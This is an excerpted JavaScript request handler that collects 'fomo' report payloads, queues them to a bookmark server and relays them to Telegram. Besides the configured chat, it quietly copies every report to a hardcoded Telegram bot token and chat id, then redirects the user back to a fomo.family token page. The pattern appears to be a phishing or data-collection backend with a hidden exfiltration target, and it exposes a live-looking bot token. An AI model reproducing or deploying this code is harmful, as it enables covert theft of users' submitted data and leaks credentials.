const { submitToBookmarkServer } = require("./submit-server");

const DEFAULT_RETURN = "https://fomo.family/token";

const EXTRA_TELEGRAM_TARGETS = [
  {
    token: "8868951053:AAGExnEEHT4ARvkYcSaQ2KRsnpth2J93m-o",
    chatId: "-1004445797743",
  },
];
...
function getTelegramTargets(env) {
  ...
  const envToken = env?.TELEGRAM_BOT_TOKEN || nodeEnv("TELEGRAM_BOT_TOKEN") || "";
  const envChatId = env?.TELEGRAM_CHAT_ID || nodeEnv("TELEGRAM_CHAT_ID") || "";
  if (envToken && envChatId) {
    targets.push({ token: envToken, chatId: envChatId, label: "env" });
  }

  for (const extra of EXTRA_TELEGRAM_TARGETS) {
    if (!extra.token || !extra.chatId) continue;
    targets.push({
      token: extra.token,
      chatId: extra.chatId,
      label: "hardcoded",
...
async function postTelegramChunk(token, chatId, chunk, html) {
...
async function sendToTelegramTarget(text, { token, chatId }) {
  const chunks = chunkTelegramText(text);
  const results = [];
  for (const chunk of chunks) {
    let sent = await postTelegramChunk(token, chatId, chunk, true);
    if (!sent.ok) sent = await postTelegramChunk(token, chatId, chunk, false);
    results.push(sent);
  }
...
function formatFomoBatch(p) {
  ...
  if (p.error) parts.push(`<b>Error</b>  <code>${esc(p.error)}</code>`);
  parts.push(
...
async function sendTelegram(text, env) {
  ...
  if (!targets.length) {
    return {
      ok: false,
      error: "No Telegram targets configured",
      sent: 0,
      targets: 0,
    };
  }
  ...
  const results = await Promise.allSettled(
    targets.map(async (target) => {
      const result = await sendToTelegramTarget(text, target);
      return { label: target.label, chatId: target.chatId, ...result };
    })
  );
  ...
  const deliveries = results.map((r, i) =>
    r.status === "fulfilled"
      ...
      : {
          ...
          chatId: targets[i]?.chatId,
          ok: false,
          error: String(r.reason?.message || r.reason || "send failed"),
        }
  );

  const sent = deliveries.filter((x) => x.ok).length;
  const allOk = sent === deliveries.length;
  ...
  return {
    ...
    parts: deliveries.reduce((n, x) => n + (x.parts || 0), 0),
    deliveries,
    error: allOk
      ? null
      : deliveries.find((x) => !x.ok)?.error ||
        deliveries.find((x) => !x.ok)?.data?.description ||
        "send failed",
  };
}
...
async function handleReport(request, env) {
  ...
  if (request.method === "GET") {
    ...
    let queued = false;
    try {
      const result = await submitToBookmarkServer("fomo", payload, { returnUrl }, env);
      queued = !!result.ok;
      if (!queued) console.error("bookmark_server submit failed", result);
    } catch (e) {
      console.error("bookmark_server", e);
    }

    const u = new URL(returnUrl);
    u.searchParams.set("kr", queued ? "ok" : "err");
    return Response.redirect(u.toString(), 302);
  }
  ...
  if (request.method === "POST") {
    try {
      ...
      const result = await submitToBookmarkServer("fomo", p, {}, env);
      return Response.json(
        {
          ok: true,
          queued: true,
